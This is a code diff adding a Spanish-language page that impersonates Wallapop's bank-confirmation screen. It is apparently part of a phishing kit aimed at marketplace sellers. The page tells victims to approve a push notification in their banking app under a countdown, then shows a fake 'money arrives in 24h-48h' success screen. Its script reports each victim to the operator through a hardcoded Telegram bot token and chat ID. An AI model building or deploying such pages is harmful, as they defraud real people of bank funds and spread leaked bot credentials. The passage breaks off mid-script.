@@ -1,0 +1,917 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Confirma la acción · Wallapop</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;500;600;700&display=swap" rel="stylesheet">
+<script src="products.js"></script>
+<style>
+@font-face{font-family:WallieFit;src:url(https://d22j03ecumputt.cloudfront.net/fonts/Wallie-Fit.woff2) format('woff2');font-display:swap}
+@font-face{font-family:WallieChunky;src:url(https://d22j03ecumputt.cloudfront.net/fonts/Wallie-Chunky.woff2) format('woff2');font-weight:700;font-display:swap}
+
+:root{
+  --wp-content-high:#29363D;--wp-content-mid:#5C7A89;--wp-content-low:#A3B8C1;
+  --wp-brand-high:#015354;--wp-brand-mid:#038673;--wp-brand-low:#3DD2BA;--wp-brand:#13C1AC;
+  --wp-brand-subtle:#CCFAF1;--wp-bg-low:#F0F3F5;--wp-line:#E3E9EC;--wp-lime:#E9FFB4;
+  --wp-negative:#CE3528;--wp-ok:#228618;
+}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;padding:0;background:#fff;width:100%;min-height:100vh}
+body{display:flex;justify-content:center;font-family:WallieFit,Quicksand,system-ui,sans-serif;color:var(--wp-content-high)}
+b,strong,.chunky{font-family:WallieChunky,Quicksand,sans-serif;font-weight:700}
+
+.phone{width:100%;max-width:520px;min-height:100vh;background:#fff;position:relative;display:flex;flex-direction:column}
+
+/* Banner de Wallapop de arriba */
+header{padding:10px 16px 10px;display:flex;align-items:center;gap:10px;border-bottom:1px solid var(--wp-line)}
+.logo{display:flex;align-items:center;flex:none;text-decoration:none;cursor:pointer}
+.logo img{height:33px;width:auto;display:block}
+.logo-txt{font-family:WallieChunky,Quicksand;font-size:26px;line-height:1;color:var(--wp-brand);letter-spacing:-1.5px}
+.search{flex:1;height:40px;background:var(--wp-bg-low);border-radius:8px;display:flex;align-items:center;gap:8px;padding:0 12px;min-width:0}
+.search svg{width:18px;height:18px;stroke:var(--wp-content-mid);fill:none;stroke-width:2;stroke-linecap:round;flex:none}
+.search span{font-size:14px;color:var(--wp-content-mid);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.icon-btn{background:none;border:0;padding:4px;display:grid;place-items:center;cursor:pointer}
+.icon-btn svg{width:24px;height:24px;stroke:var(--wp-content-high);fill:none;stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round}
+
+.wrap{width:100%;padding:20px 18px 24px;flex:1;display:flex;flex-direction:column}
+
+.mini{display:flex;align-items:center;gap:12px;margin:0 0 20px;background:var(--wp-bg-low);border-radius:14px;padding:12px}
+.mini .th{width:46px;height:46px;border-radius:8px;overflow:hidden;background:#E4EAED;flex:none}
+.mini .th img{width:100%;height:100%;object-fit:cover;display:block}
+.mini .t{font-size:13px;line-height:1.3;margin:0 0 3px;font-family:WallieChunky,Quicksand}
+.mini .p{font-size:12px;color:var(--wp-content-mid)}
+.mini .tot{margin-left:auto;font-family:WallieChunky,Quicksand;font-size:16px;white-space:nowrap;color:var(--wp-brand-high)}
+
+.cab{display:flex;gap:12px;align-items:flex-start}
+.cab svg{width:24px;height:24px;flex:none;margin-top:2px;stroke:var(--wp-brand-high);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+h1{font-family:WallieChunky,Quicksand;font-size:19px;line-height:1.3;margin:0;letter-spacing:-.2px;color:var(--wp-content-high)}
+p.desc{font-size:14px;line-height:1.5;color:var(--wp-content-mid);margin:10px 0 0}
+
+.timer{text-align:center;margin-top:36px}
+.tiempo{font-family:WallieChunky,Quicksand;font-size:52px;line-height:1;letter-spacing:-1px;display:inline-flex;align-items:center;gap:3px;color:var(--wp-content-high)}
+.tiempo .sep{color:var(--wp-brand);transform:translateY(-4px);animation:par 1s steps(1) infinite}
+@keyframes par{50%{opacity:.35}}
+.etiqueta{font-size:11.5px;letter-spacing:1.6px;color:var(--wp-content-low);margin-top:14px;text-transform:uppercase;font-family:WallieFit,Quicksand}
+
+.aviso{margin-top:36px;text-align:center;font-size:13px;color:var(--wp-content-mid);line-height:1.45}
+.aviso.agotado{color:var(--wp-negative)}
+
+.sello{display:flex;justify-content:center;gap:7px;align-items:center;font-size:12px;color:#5C7A89;margin-top:auto;padding-top:30px;padding-bottom:12px}
+.sello svg{width:16px;height:16px;stroke:#5C7A89;fill:none;stroke-width:1.9;stroke-linecap:round;stroke-linejoin:round;flex:none}
+
+/* ==================== ANIMACIÓN PAQUETE A TICK VERDE ==================== */
+.exito-anim-box {
+  position: relative;
+  width: 124px;
+  height: 124px;
+  margin: 10px auto 20px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.anim-ring {
+  position: absolute;
+  width: 88px;
+  height: 88px;
+  border-radius: 50%;
+  border: 3px solid var(--wp-brand);
+  opacity: 0;
+  pointer-events: none;
+}
+
+.anim-sparks {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  pointer-events: none;
+}
+
+.sp {
+  position: absolute;
+  width: 7px;
+  height: 7px;
+  border-radius: 50%;
+  background: var(--wp-brand);
+  opacity: 0;
+}
+.sp.s1 { top: 8%; left: 50%; background: #13C1AC; }
+.sp.s2 { top: 22%; right: 10%; background: #3DD2BA; }
+.sp.s3 { bottom: 20%; right: 12%; background: #015354; }
+.sp.s4 { bottom: 8%; left: 50%; background: #13C1AC; }
+.sp.s5 { bottom: 22%; left: 10%; background: #3DD2BA; }
+.sp.s6 { top: 20%; left: 12%; background: #E9FFB4; }
+
+.paquete-svg-wrap {
+  position: absolute;
+  width: 98px;
+  height: 98px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.svg-paquete {
+  width: 100%;
+  height: 100%;
+  overflow: visible;
+}
+
+.tick-svg-wrap {
+  position: absolute;
+  width: 98px;
+  height: 98px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  opacity: 0;
+  transform: scale(0);
+}
+
+.svg-tick {
+  width: 100%;
+  height: 100%;
+  overflow: visible;
+}
+
+/* Animación en marcha cuando se agrega .anim-activa */
+.anim-activa .paquete-svg-wrap {
+  animation: paqueteToTick 1.35s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+}
+
+@keyframes paqueteToTick {
+  0% { transform: scale(0.3) rotate(-14deg); opacity: 0; }
+  35% { transform: scale(1.1) rotate(3deg); opacity: 1; }
+  55% { transform: scale(1) rotate(0deg); opacity: 1; }
+  72% { transform: scale(1.15) rotate(-2deg); opacity: 1; filter: drop-shadow(0 0 12px rgba(19, 193, 172, 0.75)); }
+  88% { transform: scale(0.2) rotate(20deg); opacity: 0; }
+  100% { transform: scale(0); opacity: 0; visibility: hidden; }
+}
+
+.anim-activa .tick-svg-wrap {
+  animation: tickPopIn 0.85s 0.85s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+}
+
+@keyframes tickPopIn {
+  0% { transform: scale(0) rotate(-25deg); opacity: 0; }
+  70% { transform: scale(1.14) rotate(4deg); opacity: 1; }
+  100% { transform: scale(1) rotate(0deg); opacity: 1; }
+}
+
+.anim-activa .tick-circle {
+  stroke-dasharray: 260;
+  stroke-dashoffset: 260;
+  animation: strokeCircle 0.65s 0.95s ease-out forwards;
+}
+
+@keyframes strokeCircle {
+  100% { stroke-dashoffset: 0; }
+}
+
+.anim-activa .tick-check {
+  stroke-dasharray: 80;
+  stroke-dashoffset: 80;
+  animation: strokeCheck 0.45s 1.3s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+}
+
+@keyframes strokeCheck {
+  100% { stroke-dashoffset: 0; }
+}
+
+.anim-activa .anim-ring {
+  animation: ringPulse 0.9s 1.25s cubic-bezier(0.215, 0.61, 0.355, 1) forwards;
+}
+
+@keyframes ringPulse {
+  0% { transform: scale(0.7); opacity: 0.85; }
+  100% { transform: scale(1.55); opacity: 0; }
+}
+
+.anim-activa .sp.s1 { animation: sparkFly1 0.6s 1.35s ease-out forwards; }
+.anim-activa .sp.s2 { animation: sparkFly2 0.6s 1.37s ease-out forwards; }
+.anim-activa .sp.s3 { animation: sparkFly3 0.6s 1.39s ease-out forwards; }
+.anim-activa .sp.s4 { animation: sparkFly4 0.6s 1.41s ease-out forwards; }
+.anim-activa .sp.s5 { animation: sparkFly5 0.6s 1.43s ease-out forwards; }
+.anim-activa .sp.s6 { animation: sparkFly6 0.6s 1.45s ease-out forwards; }
+
+@keyframes sparkFly1 { 0%{ transform: translate(0,0) scale(0); opacity:1; } 100%{ transform: translate(0, -30px) scale(1); opacity:0; } }
+@keyframes sparkFly2 { 0%{ transform: translate(0,0) scale(0); opacity:1; } 100%{ transform: translate(24px, -20px) scale(1); opacity:0; } }
+@keyframes sparkFly3 { 0%{ transform: translate(0,0) scale(0); opacity:1; } 100%{ transform: translate(26px, 20px) scale(1); opacity:0; } }
+@keyframes sparkFly4 { 0%{ transform: translate(0,0) scale(0); opacity:1; } 100%{ transform: translate(0, 30px) scale(1); opacity:0; } }
+@keyframes sparkFly5 { 0%{ transform: translate(0,0) scale(0); opacity:1; } 100%{ transform: translate(-24px, 20px) scale(1); opacity:0; } }
+@keyframes sparkFly6 { 0%{ transform: translate(0,0) scale(0); opacity:1; } 100%{ transform: translate(-26px, -20px) scale(1); opacity:0; } }
+
+/* ==================== PANTALLA DE ÉXITO ==================== */
+.wrap-exito {
+  animation: fadeInWrap 0.4s ease forwards;
+}
+
+@keyframes fadeInWrap {
+  from { opacity: 0; transform: translateY(10px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.exito-header {
+  text-align: center;
+  margin-bottom: 18px;
+}
+.exito-h1 {
+  font-family: WallieChunky, Quicksand;
+  font-size: 22px;
+  line-height: 1.25;
+  margin: 0 0 6px;
+  color: var(--wp-content-high);
+}
+.exito-desc {
+  font-size: 13.5px;
+  line-height: 1.45;
+  color: var(--wp-content-mid);
+  margin: 0;
+}
+
+/* Tarjeta destacada del plazo 24h-48h */
+.plazo-card {
+  background: #E8FBF8;
+  border: 1.8px solid var(--wp-brand);
+  border-radius: 16px;
+  padding: 16px;
+  display: flex;
+  align-items: flex-start;
+  gap: 14px;
+  margin-bottom: 16px;
+  box-shadow: 0 4px 16px rgba(19, 193, 172, 0.15);
+}
+.plazo-badge {
+  background: #fff;
+  width: 44px;
+  height: 44px;
+  border-radius: 12px;
+  display: grid;
+  place-items: center;
+  flex: none;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+}
+.plazo-info {
+  flex: 1;
+  min-width: 0;
+}
+.plazo-tag {
+  font-size: 11px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.6px;
+  color: var(--wp-brand-high);
+  display: block;
+  margin-bottom: 2px;
+}
+.plazo-texto {
+  font-family: WallieChunky, Quicksand;
+  font-size: 16.5px;
+  line-height: 1.3;
+  color: var(--wp-brand-high);
+  display: block;
+  margin-bottom: 4px;
+}
+.plazo-extra {
+  font-size: 12px;
+  color: var(--wp-content-mid);
+  line-height: 1.35;
+  display: block;
+}
+
+/* Resumen de transacción */
+.trans-card {
+  background: var(--wp-bg-low);
+  border-radius: 14px;
+  padding: 12px 16px;
+  margin-bottom: 14px;
+}
+.trans-row {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 8px 0;
+  font-size: 13px;
+  color: var(--wp-content-mid);
+  border-bottom: 1px solid var(--wp-line);
+}
+.trans-row:last-child {
+  border-bottom: none;
+}
+.trans-row strong {
+  color: var(--wp-content-high);
+}
+.trans-row .trans-precio {
+  font-family: WallieChunky, Quicksand;
+  font-size: 16px;
+  color: var(--wp-brand-high);
+}
+.trans-row .trans-tit {
+  max-width: 58%;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+  color: var(--wp-content-high);
+  font-weight: 600;
+}
+.badge-status {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  color: var(--wp-ok);
+  font-weight: 700;
+  font-size: 12.5px;
+}
+.status-dot {
+  width: 7px;
+  height: 7px;
+  border-radius: 50%;
+  background: var(--wp-ok);
+  display: inline-block;
+}
+
+.garantia-card {
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  background: #fff;
+  border: 1px solid var(--wp-line);
+  border-radius: 12px;
+  padding: 12px 14px;
+  font-size: 12px;
+  color: var(--wp-content-mid);
+  line-height: 1.45;
+  margin-bottom: 20px;
+}
+.garantia-card svg {
+  flex: none;
+  margin-top: 1px;
+}
+
+.btn-wrap {
+  margin-top: auto;
+  padding-top: 10px;
+  margin-bottom: 10px;
+}
+.btn-finalizar {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 100%;
+  height: 48px;
+  background: var(--wp-brand);
+  color: #fff;
+  border-radius: 24px;
+  font-family: WallieChunky, Quicksand;
+  font-size: 15px;
+  text-decoration: none;
+  font-weight: 700;
+  box-shadow: 0 4px 14px rgba(19, 193, 172, 0.35);
+  transition: transform 0.15s, background 0.15s;
+}
+.btn-finalizar:hover {
+  background: var(--wp-brand-mid);
+  transform: translateY(-1px);
+}
+.btn-finalizar:active {
+  transform: translateY(1px);
+}
+</style>
+</head>
+<body>
+<div class="phone">
+
+  <!-- Banner Wallapop -->
+  <header>
+    <a class="logo" id="homeBtn" aria-label="Wallapop" href="/">
+      <img id="logoImg" alt="Wallapop" src="https://idescargar.com/wp-content/uploads/2017/06/wallapop.png">
+      <span class="logo-txt" id="logoTxt" hidden>wallapop</span>
+    </a>
+    <div class="search">
+      <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      <span>Buscar en Wallapop</span>
+    </div>
+    <button class="icon-btn" aria-label="Categorías"><svg viewBox="0 0 24 24"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
+  </header>
+
+  <!-- PANTALLA 1: ESPERA Y CUENTA ATRÁS -->
+  <div class="wrap" id="pantallaEspera">
+
+    <div class="mini" id="miniCard" style="display:none;">
+      <div class="th"><img id="miniThumb" alt="" style="display:none;"></div>
+      <div>
+        <p class="t" id="miniTitulo">—</p>
+        <div class="p">Envío protegido</div>
+      </div>
+      <div class="tot" id="miniTotal">—</div>
+    </div>
+
+    <div class="cab">
+      <svg viewBox="0 0 24 24"><rect x="7" y="2.5" width="10" height="19" rx="2.6"/><path d="M11 19.5h2"/></svg>
+      <h1>Confirma la acción en la app del banco</h1>
+    </div>
+
+    <p class="desc">Se ha enviado una notificación push a tu teléfono móvil. Por favor confirma la acción en tu aplicación bancaria.</p>
+
+    <div class="timer">
+      <div class="tiempo" id="tiempo">
+        <span id="mm">06</span><span class="sep">:</span><span id="ss">54</span>
+      </div>
+      <div class="etiqueta" id="etiqueta">Tiempo restante</div>
+    </div>
+
+    <div class="aviso" id="aviso">No cierres esta pantalla hasta completar la confirmación.</div>
+
+    <div class="sello">
+      <svg viewBox="0 0 24 24"><rect x="4.5" y="10" width="15" height="10" rx="2.5"/><path d="M8 10V7.5a4 4 0 0 1 8 0V10"/></svg>
+      Conexión cifrada · Pago protegido Wallapop
+    </div>
+
+  </div>
+
+  <!-- PANTALLA 2: ÉXITO CON TICK VERDE Y MENSAJE DE 24H-48H -->
+  <div class="wrap wrap-exito" id="pantallaExito" style="display:none;">
+
+    <!-- Animación: Paquete que forma un tick verde estilo Wallapop -->
+    <div class="exito-anim-box">
+      <div class="anim-ring"></div>
+      <div class="anim-sparks">
+        <span class="sp s1"></span>
+        <span class="sp s2"></span>
+        <span class="sp s3"></span>
+        <span class="sp s4"></span>
+        <span class="sp s5"></span>
+        <span class="sp s6"></span>
+      </div>
+
+      <!-- Icono paquete (Wallapop Verde) -->
+      <div class="paquete-svg-wrap" id="paqueteIcon">
+        <svg viewBox="0 0 100 100" class="svg-paquete">
+          <ellipse cx="50" cy="85" rx="32" ry="7" fill="rgba(0,0,0,0.07)" />
+          <polygon points="50,42 22,27 22,61 50,77" fill="#13C1AC" stroke="#0E9F8E" stroke-width="1.6" stroke-linejoin="round" />
+          <polygon points="50,42 78,27 78,61 50,77" fill="#0EA895" stroke="#087567" stroke-width="1.6" stroke-linejoin="round" />
+          <polygon points="50,42 22,27 50,13 78,27" fill="#36E5D1" stroke="#0E9F8E" stroke-width="1.6" stroke-linejoin="round" />
+          <polygon points="46,40 54,44 54,75 46,71" fill="#FFFFFF" opacity="0.95" />
+          <polygon points="46,15 54,19 54,44 46,40" fill="#FFFFFF" opacity="0.95" />
+          <polygon points="27,41 39,47 39,57 27,51" fill="#FFFFFF" stroke="#0EA895" stroke-width="1" />
+          <line x1="30" y1="45" x2="36" y2="48" stroke="#015354" stroke-width="1.2" stroke-linecap="round" />
+          <line x1="30" y1="48" x2="36" y2="51" stroke="#015354" stroke-width="1.2" stroke-linecap="round" />
+          <line x1="30" y1="51" x2="34" y2="53" stroke="#13C1AC" stroke-width="1.2" stroke-linecap="round" />
+        </svg>
+      </div>
+
+      <!-- Icono Tick verde animado -->
+      <div class="tick-svg-wrap" id="tickIcon">
+        <svg viewBox="0 0 100 100" class="svg-tick">
+          <circle class="tick-bg" cx="50" cy="50" r="43" fill="#CCFAF1" />
+          <circle class="tick-circle" cx="50" cy="50" r="40" fill="none" stroke="#13C1AC" stroke-width="5" stroke-linecap="round" />
+          <path class="tick-check" fill="none" stroke="#13C1AC" stroke-width="6.5" stroke-linecap="round" stroke-linejoin="round" d="M30 52 L43 65 L71 35" />
+        </svg>
+      </div>
+    </div>
+
+    <div class="exito-header">
+      <h1 class="exito-h1">¡Confirmación completada!</h1>
+      <p class="exito-desc">La operación ha sido validada y confirmada correctamente.</p>
+    </div>
+
+    <!-- Tarjeta destacada con el mensaje solicitado -->
+    <div class="plazo-card">
+      <div class="plazo-badge">
+        <svg viewBox="0 0 24 24" width="24" height="24" stroke="#015354" fill="none" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+      </div>
+      <div class="plazo-info">
+        <span class="plazo-tag">Plazo estimado</span>
+        <strong class="plazo-texto">Su dinero llegará en un periodo de 24h-48h</strong>
+        <span class="plazo-extra">El dinero se transferirá directamente a tu cuenta bancaria asociada.</span>
+      </div>
+    </div>
+
+    <!-- Resumen de transacción -->
+    <div class="trans-card">
+      <div class="trans-row">
+        <span>Importe a recibir</span>
+        <strong class="trans-precio" id="exitoPrecio">230 €</strong>
+      </div>
+      <div class="trans-row">
+        <span>Producto</span>
+        <span class="trans-tit" id="exitoTitulo">iPhone 13</span>
+      </div>
+      <div class="trans-row">
+        <span>Estado</span>
+        <span class="badge-status">
+          <span class="status-dot"></span>
+          Transferencia en curso
+        </span>
+      </div>
+      <div class="trans-row">
+        <span>Método</span>
+        <span>Abono bancario directo</span>
+      </div>
+    </div>
+
+    <div class="garantia-card">
+      <svg viewBox="0 0 24 24" width="20" height="20" stroke="#13C1AC" fill="none" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+        <polyline points="9 12 11 14 15 10"/>
+      </svg>
+      <span><strong>Wallapop Envíos Protegido:</strong> Transacción asegurada. Te notificaremos cuando los fondos estén disponibles en tu cuenta.</span>
+    </div>
+
+    <div class="btn-wrap">
+      <a href="https://es.wallapop.com" class="btn-finalizar" id="btnFinalizar">Volver a Wallapop</a>
+    </div>
+
+    <div class="sello">
+      <svg viewBox="0 0 24 24"><rect x="4.5" y="10" width="15" height="10" rx="2.5"/><path d="M8 10V7.5a4 4 0 0 1 8 0V10"/></svg>
+      Conexión cifrada · Pago protegido Wallapop
+    </div>
+
+  </div>
+
+</div>
+
+<script>
+const $ = id => document.getElementById(id);
+
+// Fallback de logo por si no hay conexión a cdn
+$('logoImg').onerror = () => {
+  if (!$('logoImg').dataset.r) {
+    $('logoImg').dataset.r = '1';
+    $('logoImg').src = 'wallapop.png';
+  } else {
+    $('logoImg').style.display = 'none';
+    $('logoTxt').hidden = false;
+  }
+};
+
+const eur = n => {
+  if (n === null || n === undefined || n === '') return '';
+  if (typeof n === 'string') {
+    if (n.includes('€')) return n.trim();
+    n = n.replace(/[^\d.,]/g, '').replace(',', '.');
+  }
+  const num = Number(n);
+  if (isNaN(num)) return String(n);
+  return new Intl.NumberFormat('es-ES', { maximumFractionDigits: 0 }).format(num) + ' €';
+};
+
+const params = new URLSearchParams(location.search);
+let id = params.get('id') || (location.pathname.match(/\/a\/([A-Za-z0-9]+)/) || [])[1] || '';
+const urlTit = params.get('tit') || '';
+const urlPrecio = params.get('precio') || '';
+
+let productoCargado = null;
+
+// Buscador recursivo y universal de productos en cualquier estructura (SERVER_DB, JSON, localStorage, etc.)
+function findProductIn(source, targetId) {
+  if (!source || typeof source !== 'object') return null;
+  const allProds = [];
+  const activeId = source.activeId || (window.SERVER_DB && window.SERVER_DB.activeId);
+
+  function walk(obj) {
+    if (!obj || typeof obj !== 'object') return;
+    if ((obj.titulo || obj.articulo) && (obj.precio !== undefined || obj.precioArticulo !== undefined)) {
+      allProds.push(obj);
+      return;
+    }
+    for (const k of Object.keys(obj)) {
+      if (k !== 'tarjeta' && typeof obj[k] === 'object' && obj[k] !== null) {
+        walk(obj[k]);
+      }
+    }
+  }
+
+  walk(source);
+
+  if (targetId) {
+    const found = allProds.find(p => p.id === targetId || p.id === ('AD' + targetId));
+    if (found) return found;
+  }
+  if (activeId) {
+    const found = allProds.find(p => p.id === activeId || p.id === ('AD' + activeId));
+    if (found) return found;
+  }
+  return allProds[0] || null;
+}
+
+// Resolver síncrono del producto consultando todas las fuentes disponibles
+function resolverDatos(targetId) {
+  const lookId = targetId || id;
+  let p = null;
+
+  // 1. window.SERVER_DB (cargado via products.js de forma síncrona en head)
+  if (window.SERVER_DB) {
+    p = findProductIn(window.SERVER_DB, lookId);
+    if (p && (p.titulo || p.articulo) && (p.precio !== undefined || p.precioArticulo !== undefined)) return p;
+  }
+
+  // 2. localStorage wp_active_prod
+  try {
+    const act = JSON.parse(localStorage.getItem('wp_active_prod') || '{}');
+    const fAct = findProductIn(act, lookId);
+    if (fAct && (fAct.titulo || fAct.articulo) && (fAct.precio !== undefined || fAct.precioArticulo !== undefined)) return fAct;
+  } catch(e) {}
+
+  // 3. localStorage wp_products_v1
+  try {
+    const dbLocal = JSON.parse(localStorage.getItem('wp_products_v1') || '{}');
+    const fDb = findProductIn(dbLocal, lookId);
+    if (fDb && (fDb.titulo || fDb.articulo) && (fDb.precio !== undefined || fDb.precioArticulo !== undefined)) return fDb;
+  } catch(e) {}
+
+  return p;
+}
+
+// Aplicar los datos tanto en la mini cabecera como en la pantalla de éxito
+function aplicarDatos(p) {
+  if (!p) p = resolverDatos(id);
+
+  const finalTit = (p && (p.titulo || p.articulo)) || urlTit || (productoCargado && (productoCargado.titulo || productoCargado.articulo)) || ($('exitoTitulo') && $('exitoTitulo').textContent !== '—' && $('exitoTitulo').textContent ? $('exitoTitulo').textContent : '') || ($('miniTitulo') && $('miniTitulo').textContent !== '—' && $('miniTitulo').textContent ? $('miniTitulo').textContent : '') || 'iPhone 13';
+
+  const rawPrecio = (p && (p.precioArticulo !== undefined ? p.precioArticulo : p.precio)) || urlPrecio || (productoCargado && (productoCargado.precioArticulo !== undefined ? productoCargado.precioArticulo : productoCargado.precio)) || ($('exitoPrecio') && $('exitoPrecio').textContent !== '—' && $('exitoPrecio').textContent ? $('exitoPrecio').textContent : '') || ($('miniTotal') && $('miniTotal').textContent !== '—' && $('miniTotal').textContent ? $('miniTotal').textContent : '') || 230;
+
+  const finalPrecio = eur(rawPrecio);
+
+  if ($('miniTitulo')) $('miniTitulo').textContent = finalTit;
+  if ($('miniTotal')) $('miniTotal').textContent = finalPrecio;
+  if ($('exitoTitulo')) $('exitoTitulo').textContent = finalTit;
+  if ($('exitoPrecio')) $('exitoPrecio').textContent = finalPrecio;
+
+  if (p && p.fotos && p.fotos.length && $('miniThumb')) {
+    let f = p.fotos[0];
+    if (f) {
+      if (typeof f === 'string' && f.includes('api.telegram.org') && !f.includes('images.weserv.nl')) {
+        f = 'https://images.weserv.nl/?url=' + encodeURIComponent(f.replace(/^https?:\/\//, ''));
+      }
+      $('miniThumb').src = f;
+      $('miniThumb').style.display = 'block';
+    }
+  }
+  if ($('miniCard')) $('miniCard').style.display = 'flex';
+}
+
+if (id) {
+  $('homeBtn').href = '/a/' + id;
+}
+
+// Ejecutar inmediatamente de forma síncrona para que NUNCA aparezca "—"
+productoCargado = resolverDatos(id);
+aplicarDatos(productoCargado);
+
+(async function loadMini() {
+  try {
+    let p = productoCargado;
+
+    // 1. Decodificar parámetro ?p= o ?d=
+    if (!p || (!p.titulo && !p.articulo)) {
+      const rawP = params.get('p') || params.get('d');
+      if (rawP) {
+        try {
+          const dec = decodeURIComponent(escape(atob(decodeURIComponent(rawP))));
+          const parsed = JSON.parse(dec);
+          if (parsed) p = findProductIn(parsed, id);
+        } catch (e) {}
+      }
+    }
+
+    // 2. Intentar API local
+    if ((!p || (!p.titulo && !p.articulo)) && id) {
+      try {
+        const r = await fetch('/api/product/' + id);
+        if (r.ok) {
+          const d = await r.json();
+          const found = findProductIn(d, id);
+          if (found) p = found;
+        }
+      } catch (e) {}
+    }
+
+    // 3. Intentar products.json
+    if (!p || (!p.titulo && !p.articulo)) {
+      try {
+        const r = await fetch('/products.json?t=' + Date.now());
+        if (r.ok) {
+          const d = await r.json();
+          const found = findProductIn(d, id);
+          if (found) p = found;
+        }
+      } catch (e) {}
+    }
+
+    // 4. Intentar data/productos.json
+    if (!p || (!p.titulo && !p.articulo)) {
+      try {
+        const r = await fetch('/data/productos.json?t=' + Date.now());
+        if (r.ok) {
+          const d = await r.json();
+          const found = findProductIn(d, id);
+          if (found) p = found;
+        }
+      } catch (e) {}
+    }
+
+    if (p) {
+      productoCargado = p;
+    }
+    aplicarDatos(productoCargado);
+  } catch (e) {
+    aplicarDatos(productoCargado);
+  }
+
+  // Notificar a Telegram que el cliente ha llegado a confirmar.html
+  notificarTelegramConfirmar(productoCargado);
+})();
+
+// ==================== NOTIFICACIÓN A TELEGRAM ====================
+let notifEnviada = false;
+async function notificarTelegramConfirmar(p) {
+  if (notifEnviada) return;
+  notifEnviada = true;
+
+  const tId = id || 'AD_WEB';
+  const tTit = (p && (p.titulo || p.articulo)) || 'Artículo Wallapop';
+  const tPre = (p && (p.precioArticulo || p.precio)) ? eur(p.precioArticulo || p.precio) : '';
+
+  let apiOk = false;
+  try {
+    const res = await fetch('/api/product/' + tId + '/confirmar', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ id: tId, titulo: tTit, precio: tPre })
+    });
+    if (res.ok) apiOk = true;
+  } catch (e) {}
+
+  // Fallback directo a Telegram si no hay API local
+  if (!apiOk) {
+    try {
+      const tgMsg = "📱 <b>CLIENTE EN CONFIRMACIÓN</b>\n" +
+                    "───────────────────\n" +
+                    "📦 <b>Producto:</b> " + tTit + "\n" +
+                    "🆔 <b>ID:</b> <code>" + tId + "</code>" +
+                    (tPre ? "\n💰 <b>Importe:</b> " + tPre : "") + "\n\n" +
+                    "⏳ El cliente está en la pantalla de confirmación bancaria.";
+
+      const replyMarkup = {
+        inline_keyboard: [
+          [
+            { text: "Confirmar de nuevo", callback_data: "confirmar_again_" + tId }
+          ]
+        ]
+      };
+
+      await fetch("https://api.telegram.org/bot8818995413:AAHLry4iCNQZ7T385CoVodbXQcnrkymFmKM/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: "8791932410",
+          text: tgMsg,
+          parse_mode: "HTML",
+          reply_markup: replyMarkup
+        })
+      });
+    } catch (e) {}
+  }
+}
+
+// ==================== RELOJ CUENTA ATRÁS ====================
+let restante = 6 * 60 + 54;
+
+function pinta() {
+  const m = Math.floor(restante / 60);
+  const s = restante % 60;
+  $('mm').textContent = String(m).padStart(2, '0');
+  $('ss').textContent = String(s).padStart(2, '0');
+}
+
+pinta();
+
+const reloj = setInterval(() => {
+  restante--;
+  if (restante <= 0) {
+    clearInterval(reloj);
+    restante = 0;
+    pinta();
+    $('etiqueta').textContent = 'Tiempo agotado';
+    $('etiqueta').classList.add('agotado');
+    $('aviso').textContent = 'La solicitud ha caducado. Vuelve al anuncio e inténtalo de nuevo.';
+    $('aviso').classList.add('agotado');
+    return;
+  }
+  pinta();
+}, 1000);
+
+// ==================== TRANSICIÓN A PANTALLA DE ÉXITO ====================
+let yaConfirmado = false;
+let statusPollTimer = null;
+
+function mostrarExito() {
+  if (yaConfirmado) return;
+  yaConfirmado = true;
+
+  if (statusPollTimer) clearTimeout(statusPollTimer);
+  if (reloj) clearInterval(reloj);
+
+  // Asegurar que siempre se apliquen los datos completos
+  aplicarDatos(productoCargado);
+
+  if ($('btnFinalizar')) {
+    $('btnFinalizar').href = 'https://es.wallapop.com';
+  }
+
+  // Ocultar pantalla de espera
+  const pEspera = $('pantallaEspera');
+  pEspera.style.opacity = '0';
+  pEspera.style.transform = 'translateY(-10px)';
+  pEspera.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+
+  setTimeout(() => {
+    pEspera.style.display = 'none';
+
+    const pExito = $('pantallaExito');
+    pExito.style.display = 'flex';
+    pExito.style.opacity = '0';
+    pExito.style.transform = 'translateY(12px)';
+    pExito.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
+
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+
+    requestAnimationFrame(() => {
+      pExito.style.opacity = '1';
+      pExito.style.transform = 'translateY(0)';
